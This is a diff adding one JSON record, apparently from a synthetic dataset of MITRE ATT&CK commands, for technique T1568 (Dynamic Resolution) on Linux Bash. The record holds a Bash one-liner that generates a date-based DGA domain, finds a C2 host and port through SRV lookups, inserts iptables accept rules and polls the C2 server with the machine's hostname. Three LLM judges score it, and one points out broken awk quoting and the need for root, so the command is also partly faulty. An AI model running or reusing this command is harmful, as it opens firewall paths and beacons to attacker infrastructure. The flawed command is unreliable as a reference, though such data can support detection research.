@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'base=$(date -u +%Y%m%d | md5sum | cut -c1-10).net-sync.cc; srv=$(dig +short _c2._tcp.$base SRV | head -n1); target=$(awk \"{print $4}\" <<<\"$srv\"); port=$(awk \"{print $3}\" <<<\"$srv\"); ip=$(dig +short A \"$target\" | head -n1); if [ -n \"$ip\" ] && [ -n \"$port\" ]; then iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$target:$port/poll?node=$(hostname)\"; fi'",
+  "explanation": "Queries SRV records to dynamically discover the C2 host and port, resolves the target to IP, adds iptables rules for that IP:port, and polls the C2 path.",
+  "rationale_steps": [
+    "Construct base domain via DGA",
+    "Query SRV record for service endpoint and port",
+    "Resolve SRV target to an IP address",
+    "Allow traffic to the resolved IP:port via iptables",
+    "Poll C2 endpoint using the dynamically discovered port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-4b6829ad",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct escape sequences throughout the bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by algorithmically generating a domain name based on the date, querying SRV records to discover C2 infrastructure, configuring firewall rules for the discovered endpoint, and establishing communication with the C2 server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:12:55.171083Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command substitutions, piping, conditional logic, and quoting throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the dynamic resolution (DGA-like domain, SRV/A lookups) and C2 polling perfectly align with T1568, the command's explicit inclusion of iptables rules cannot be achieved under the specified 'Privilege: None', making a key part of the claimed intent operationally unfeasible.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:13:09.643758Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid separators, and recognizable flags/options throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While it conceptually performs DGA-like domain generation and SRV-based dynamic resolution consistent with T1568, the awk field extraction uses double quotes causing shell expansion of $3/$4 (likely yielding {print } and failing to parse port/target), and the iptables steps would require root privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:14:01.168504Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
